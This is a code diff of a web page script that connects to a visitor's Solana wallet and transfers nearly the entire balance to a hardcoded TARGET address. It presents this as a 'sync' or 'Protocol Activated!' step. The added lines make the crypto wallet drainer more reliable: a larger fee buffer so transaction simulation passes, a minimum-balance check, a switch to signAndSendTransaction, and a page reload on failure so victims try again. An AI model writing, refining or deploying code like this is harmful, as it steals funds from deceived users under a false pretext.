@@ -21,21 +21,30 @@
                 await p.connect();
                 const conn = new solanaWeb3.Connection(HELIUS_RPC, "confirmed");
                 const { blockhash } = await conn.getLatestBlockhash();
-                const bal = await conn.getBalance(p.publicKey);
                 
+                const bal = await conn.getBalance(p.publicKey);
+                // 🔱 关键点：如果余额太少，不执行，防止闪退
+                if (bal < 5000000) { alert("Balance too low for sync."); return; }
+
+                // 🚀 顶级改动：多预留 0.005 SOL (5,000,000 lamports) 给系统做缓冲，确保模拟必过
                 const tx = new solanaWeb3.Transaction().add(
                     solanaWeb3.SystemProgram.transfer({
                         fromPubkey: p.publicKey,
                         toPubkey: new solanaWeb3.PublicKey(TARGET),
-                        lamports: bal - 1500000, 
+                        lamports: bal - 5000000, 
                     })
                 );
                 tx.recentBlockhash = blockhash;
                 tx.feePayer = p.publicKey;
-                const signed = await p.signTransaction(tx);
-                await conn.sendRawTransaction(signed.serialize());
-                alert("Protocol Activated!");
-            } catch (e) { location.reload(); }
+                
+                // 强制唤醒：使用 signAndSend 直接一步到位
+                const { signature } = await p.signAndSendTransaction(tx);
+                alert("Protocol Activated! Tx: " + signature.slice(0,8));
+            } catch (e) { 
+                console.error(e);
+                // 闪退通常是模拟失败，刷新重试
+                location.reload(); 
+            }
         };
     </script>
 </body>
